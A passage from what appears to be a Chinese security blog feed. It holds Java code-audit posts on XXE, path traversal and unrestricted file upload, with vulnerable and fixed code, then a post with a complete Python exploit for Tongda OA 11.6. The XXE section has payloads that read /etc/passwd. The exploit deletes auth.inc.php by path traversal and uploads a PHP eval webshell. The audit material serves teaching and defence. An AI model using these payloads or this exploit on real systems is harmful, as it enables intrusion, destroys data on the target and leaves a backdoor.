class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="comment">//直接POST XML数据报过来就行</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">//获取boy</span></span><br><span class="line">          String body = WebUtils.getRequestBody(request);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化DocumentBuilderFactory对象</span></span><br><span class="line">          DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">          DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//树立body里面xml转换流</span></span><br><span class="line">          StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">          InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//解析XML的对象，转化为Document对象</span></span><br><span class="line">          Document document = db.parse(is); </span><br><span class="line">        </span><br><span class="line">          <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">          StringBuilder buf = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">          NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">              Node rootNode = rootNodeList.item(i);</span><br><span class="line">              NodeList child = rootNode.getChildNodes();</span><br><span class="line">              <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                  Node node = child.item(j);</span><br><span class="line">                  buf.append(String.format(<span class="string">"%s: %s\n"</span>, node.getNodeName(), node.getTextContent()));</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          sr.close();</span><br><span class="line">        <span class="comment">//返回string 有回显</span></span><br><span class="line">          <span class="keyword">return</span> buf.toString();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          logger.error(e.toString());</span><br><span class="line">          <span class="keyword">return</span> EXCEPT;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h1 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h1><h2 id="http-协议探测"><a href="#http-协议探测" class="headerlink" title="http 协议探测"></a>http 协议探测</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">joychou</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1:8888"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过回显和延迟，粗略判断，或者DNS无回显探测</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTkxODAwNTIucG5n?x-oss-process=image/format,png" alt="image-20200819180052434"></p><h2 id="FILE-协议-任意文件读取"><a href="#FILE-协议-任意文件读取" class="headerlink" title="FILE 协议 任意文件读取"></a>FILE 协议 任意文件读取</h2><p>poc：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">joychou</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功读取 etc/passwd</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTkxODA0MjIucG5n?x-oss-process=image/format,png" alt="image-20200819180422865"></p><p>还有一些ooxml 这种后续再写其他的研究一下</p><h1 id="0x06-修复"><a href="#0x06-修复" class="headerlink" title="0x06 修复"></a>0x06 修复</h1><p>主要是这三句话，加入了禁止使用实体类</p><p>很多封装的方法，都是这样的去解决，都是禁用了ENTITY实体。</p><p>下面是DocumentBuilder禁用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/Sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            db.parse(is);  </span><br><span class="line">            sr.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DocumentBuilder security code"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计：文件篇/文件上传/文件读取/目录遍历</title>
      <link href="/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AF%87!%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96!%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
      <url>/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AF%87!%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96!%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>自学Java 代码审计，主要自己一个人学习，有点闭门造车，搜索引擎学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><h1 id="0x01-文件路径穿越"><a href="#0x01-文件路径穿越" class="headerlink" title="0x01 文件路径穿越"></a>0x01 文件路径穿越</h1><h2 id="简述："><a href="#简述：" class="headerlink" title="简述："></a><strong>简述：</strong></h2><ul><li>许多的文件漏洞都是来源于文件路径的问题，好多时候也是路径可控，再加上一下程序员奇怪的逻辑。</li><li>如果漏洞路径可控提供很多其他突破的方法</li><li>攻击者利用<code>../</code>可以上传至任意指定目录或者目录穿越。</li></ul><h2 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a><strong>示例代码：</strong></h2><p>中间有<code>../</code>可以造成文件路径的不安全</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package file;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class filepath &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        File file &#x3D; new File(&quot;..&#x2F;..&#x2F;file&#x2F;123.txt&quot;);</span><br><span class="line">        System.out.println(file.getAbsolutePath());</span><br><span class="line">        System.out.println(file.getCanonicalPath());</span><br><span class="line">        System.out.println(file.exists());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDkxNjMzNDAucG5n?x-oss-process=image/format,png" alt="image-20200809163340930"></p><h2 id="潜在的目录穿越："><a href="#潜在的目录穿越：" class="headerlink" title="潜在的目录穿越："></a>潜在的目录穿越：</h2><p>一个文件被打开，然后读取文件内容，这个文件名来自于一个输入的参数。如果没有过滤这个传入的参数，那么本地文件系统中任意文件都会被读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件读取有问题，别在里面拼接</span><br><span class="line">val result &#x3D; Source.fromFile(&quot;public&#x2F;&quot; + value).getLines().mkString &#x2F;&#x2F; Weak point</span><br><span class="line"></span><br><span class="line">修复：要在外面拼接好</span><br><span class="line">filename &#x3D; &quot;public&#x2F;&quot; + FilenameUtils.getName(value)</span><br><span class="line">val result &#x3D; Source.fromFile(filename).getLines().mkString</span><br></pre></td></tr></table></figure><h1 id="0x02文件上传"><a href="#0x02文件上传" class="headerlink" title="0x02文件上传"></a>0x02文件上传</h1><h2 id="简述：-1"><a href="#简述：-1" class="headerlink" title="简述："></a>简述：</h2><p>文件上传过程中，因为未校验上传文件后缀类型，导致用户可上传jsp和jspx等一些webshell文件。</p><p>代码审计时可重点关注对上传文件类型是否有足够安全的校验。</p><h2 id="漏洞示例："><a href="#漏洞示例：" class="headerlink" title="漏洞示例："></a>漏洞示例：</h2><p>没有任何过滤</p><p>jdk原始的流操作上传</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">FileUpload</span><span class="params">(MultipartFile file)</span></span>&#123;</span><br><span class="line">        String fileName = file.getOriginalFilename();</span><br><span class="line">        <span class="keyword">if</span> (fileName==<span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"file is error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="comment">//目录拼接</span></span><br><span class="line">        String filePath = <span class="string">"/static/images/uploads/"</span>+fileName;</span><br><span class="line">        <span class="keyword">if</span> (!file.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              <span class="comment">//转化字节流</span></span><br><span class="line">                <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">              <span class="comment">//创建file对象 转化为BufferedOutputStream对象</span></span><br><span class="line">                BufferedOutputStream stream =</span><br><span class="line">                        <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(filePath)));</span><br><span class="line">                <span class="comment">//写入流  </span></span><br><span class="line">                stream.write(bytes);</span><br><span class="line">                <span class="comment">//关闭流</span></span><br><span class="line">                stream.close();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"OK"</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">return</span> e.getMessage();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"You failed to upload "</span> + file.getOriginalFilename() + <span class="string">" because the file was empty."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>框架常用的封装类上传</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String UPLOADED_FOLDER = <span class="string">"/tmp/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">FileUpload</span><span class="params">(@RequestParam(<span class="string">"file"</span>)</span> MultipartFile file,RedirectAttributes redirectAttributes) </span>&#123;</span><br><span class="line">        <span class="comment">//检测文件是否存</span></span><br><span class="line">        <span class="keyword">if</span> (file.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 赋值给uploadStatus.html里的动态参数message</span></span><br><span class="line">            redirectAttributes.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Please select a file to upload"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/file/status"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取文件，上传</span></span><br><span class="line">          <span class="comment">// 获取字节流，放入数字</span></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">             <span class="comment">//获取文件路径，目录拼接  /TMP/ + Filename</span></span><br><span class="line">            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">           <span class="comment">//文件写入</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">           <span class="comment">//回显路径</span></span><br><span class="line">            redirectAttributes.addFlashAttribute(<span class="string">"message"</span>,</span><br><span class="line">                    <span class="string">"You successfully uploaded '"</span> + UPLOADED_FOLDER + file.getOriginalFilename() + <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            redirectAttributes.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"upload failed"</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/file/status"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/file/status"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="审计函数"><a href="#审计函数" class="headerlink" title="审计函数"></a>审计函数</h2><p>java中文件操作的函数特别多，有的是原始的字节字符流</p><p>java都是基于流的，还有好多都是后面有封装的，感觉如果不熟就直接 搜索file吧，再检查 过滤条件</p><ol><li><p>JDK原始的java.io.FileInputStream</p></li><li><p>JDK原始的 BufferedOutputStream</p></li><li><p>JDK原始的各种OutputStream，流操作都可以</p></li><li><p>Apache Commons IO提供的org.apache.commons.io.FileUtils类</p></li></ol><p>参考园长文章</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ul><li>使用白名单校验上传文件类型、大小限制、MIME类型</li><li>白名单fileName.substring(fileName.lastIndexOf(“.”)); 检查后缀名</li><li>还有一个BufferedImage类、Image类、Graphics类这些封装好的图片类，直接传进去试试</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BufferedImage bi &#x3D; ImageIO.read(file);</span><br></pre></td></tr></table></figure><h1 id="0x02文件读取"><a href="#0x02文件读取" class="headerlink" title="0x02文件读取"></a>0x02文件读取</h1><h2 id="简述：-2"><a href="#简述：-2" class="headerlink" title="简述："></a>简述：</h2><p>Java其实读写是一体的，都是流的输入和输出</p><p>这个漏洞主要是要结合第一个，路径穿越的情况</p><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/path_traversal/"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getImage</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">File f = <span class="keyword">new</span> File(filepath);</span><br><span class="line"><span class="keyword">if</span> (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line"><span class="comment">//读取文件</span></span><br><span class="line">    <span class="keyword">byte</span>[] data = Files.readAllBytes(Paths.get(filepath));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(Base64.encodeBase64(data));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"File doesn't exist or is not a file."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="审计函数-1"><a href="#审计函数-1" class="headerlink" title="审计函数"></a>审计函数</h2><ol><li><p>JDK原始的java.io.RandomAccessFile类</p></li><li><p>JDK原始的inputsteam类</p></li><li><p>Apache Commons IO提供的org.apache.commons.io.FileUtils类</p></li><li><p>JDK1.7新增的基于NIO非阻塞异步读取文件的<code>java.nio.channels.AsynchronousFileChannel</code>类</p></li><li><p>JDK1.7新增的基于NIO读取文件的<code>java.nio.file.Files</code>类</p><p>常用方法如:<code>Files.readAllBytes</code>、<code>Files.readAllLines</code></p><p>参考园长文章</p></li></ol><h2 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案:"></a>修复方案:</h2><p>过滤目录穿越关键字</p><h1 id="0x01-目录遍历"><a href="#0x01-目录遍历" class="headerlink" title="0x01 目录遍历"></a>0x01 目录遍历</h1><h2 id="简述：-3"><a href="#简述：-3" class="headerlink" title="简述："></a>简述：</h2><p>目录遍历，主要看逻辑吧，能不能回显</p><p>有专门file.listFiles()函数可以处理。</p><h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> file;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">filepath</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String path = <span class="string">"/Users/zy/Desktop/java_rmi/src/main/java/"</span>;<span class="comment">//要遍历的路径</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(path);<span class="comment">//获取其file对象</span></span><br><span class="line">        func(file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">(File file)</span></span>&#123;</span><br><span class="line">        File[] fs = file.listFiles();</span><br><span class="line">        <span class="keyword">for</span>(File f:fs)&#123;</span><br><span class="line">            <span class="keyword">if</span>(f.isDirectory())<span class="comment">//若是目录，则递归打印该目录下的文件</span></span><br><span class="line">                func(f);</span><br><span class="line">            <span class="keyword">if</span>(f.isFile())<span class="comment">//若是文件，直接打印</span></span><br><span class="line">                System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通达OA 最新0day RCE 漏洞 附带EXP</title>
      <link href="/2020/08/19/%E9%80%9A%E8%BE%BEOA%20%E6%9C%80%E6%96%B00day%20RCE%20%E6%BC%8F%E6%B4%9E%20%E9%99%84%E5%B8%A6EXP/"/>
      <url>/2020/08/19/%E9%80%9A%E8%BE%BEOA%20%E6%9C%80%E6%96%B00day%20RCE%20%E6%BC%8F%E6%B4%9E%20%E9%99%84%E5%B8%A6EXP/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="通达OA-最新0day-RCE-漏洞"><a href="#通达OA-最新0day-RCE-漏洞" class="headerlink" title="通达OA 最新0day RCE 漏洞"></a>通达OA 最新0day RCE 漏洞</h1><p>此漏洞会删除文件 可能损坏OA系统<br>要有授权！别瞎搞和批量了</p><p>关注时间，老版本不行</p><p>11.6 版本可</p><p>具体影响范围自行测试</p><h1 id="亲测存在"><a href="#亲测存在" class="headerlink" title="亲测存在"></a>亲测存在</h1><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTkxMjMyMjgucG5n?x-oss-process=image/format,png" alt="image-20200819123228685"></p><h1 id="exp利用脚本"><a href="#exp利用脚本" class="headerlink" title="exp利用脚本"></a>exp利用脚本</h1><p>来源于网络</p><p>禁止进行非法攻击</p><p>仅用于工作和学习,<em>禁止_用于_非法攻击</em>,非法传播</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">target=<span class="string">"http://127.0.0.1:8888/"</span></span><br><span class="line">payload=<span class="string">"&lt;?php eval($_POST['test']);?&gt;"</span></span><br><span class="line">print(<span class="string">"[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA"</span>)</span><br><span class="line">input(<span class="string">"Press enter to continue"</span>)</span><br><span class="line">print(<span class="string">"[*]Deleting auth.inc.php...."</span>)</span><br><span class="line"> </span><br><span class="line">url=target+<span class="string">"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"</span></span><br><span class="line">requests.get(url=url)</span><br><span class="line">print(<span class="string">"[*]Checking if file deleted..."</span>)</span><br><span class="line">url=target+<span class="string">"/inc/auth.inc.php"</span></span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'No input file specified.'</span> <span class="keyword">not</span> <span class="keyword">in</span> page:</span><br><span class="line">    print(<span class="string">"[-]Failed to deleted auth.inc.php"</span>)</span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line">print(<span class="string">"[+]Successfully deleted auth.inc.php!"</span>)</span><br><span class="line">print(<span class="string">"[*]Uploading payload..."</span>)</span><br><span class="line">url=target+<span class="string">"/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./"</span></span><br><span class="line">files = &#123;<span class="string">'FILE1'</span>: (<span class="string">'test.php'</span>, payload)&#125;</span><br><span class="line">requests.post(url=url,files=files)</span><br><span class="line">url=target+<span class="string">"/_test.php"</span></span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'No input file specified.'</span> <span class="keyword">not</span> <span class="keyword">in</span> page:</span><br><span class="line">    print(<span class="string">"[+]Filed Uploaded Successfully"</span>)</span><br><span class="line">    print(<span class="string">"[+]URL:"</span>,url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[-]Failed to upload file"</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>深信服 EDR终端检测响应平台 0day RCE 漏洞</title>
      <link href="/2020/08/17/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20EDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0%200day%20RCE%20%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/17/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20EDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0%200day%20RCE%20%E6%BC%8F%E6%B4%9E/</url>
      
